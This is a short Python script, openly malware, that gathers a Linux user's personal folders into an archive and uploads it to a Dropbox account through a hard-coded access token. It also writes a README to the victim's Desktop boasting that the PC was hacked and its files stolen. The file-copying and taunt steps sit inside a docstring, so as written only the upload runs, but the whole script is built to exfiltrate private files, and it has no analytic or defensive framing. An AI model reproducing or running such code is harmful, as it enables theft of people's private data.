import dropbox
import os
from os import system

def main():
    """
    login = os.getlogin()
    system("mkdir /home/{}/virus_data".format(login))
    system(f"cp -r /home/{login}/Desktop /home/{login}/virus_data")
    system(f"cp -r /home/{login}/Documents /home/{login}/virus_data")
    system(f"cp -r /home/{login}/Downloads /home/{login}/virus_data")
    system(f"cp -r /home/{login}/Music /home/{login}/virus_data")
    system(f"cp -r /home/{login}/Pictures /home/{login}/virus_data")
    system(f"cp -r /home/{login}/Public /home/{login}/virus_data")
    system(f"cp -r /home/{login}/Templates /home/{login}/virus_data")
    system(f"cp -r /home/{login}/Videos /home/{login}/virus_data")
    file_ = f"/home/{login}/Desktop/README.txt"
    with open(file_, 'w') as file:
        file.write("Hello !!!\n\nThis file is for notify you that your PC has been hacked by me.\n\nI stolen all files from your pc (Not everything only the very important files :) )\n\nGood Bye bro !!!")
    system("tar -cvf data.tar /home/{}/virus_data".format(login))
    """
    client_ = dropbox.client.DropboxClient('sl.Ay1onPSLNZRZwjmoasrvt9PtQdiRhSmu_igC4UA2TSmLSJDLKetmQKRfgAO_NzSRI3m1EUQw69W4PxzU3yqn8wEEJOPvywkWwuGUy1V4a-xJyjJ4tt6mATAZ0sBtx9sNISwhwCU')
    file_name = "data.tar"
    file = open(file_name, 'rb')
    answer = client_.put_file('/DropboxAPI/'+file_name, file)
    print(answer)

main()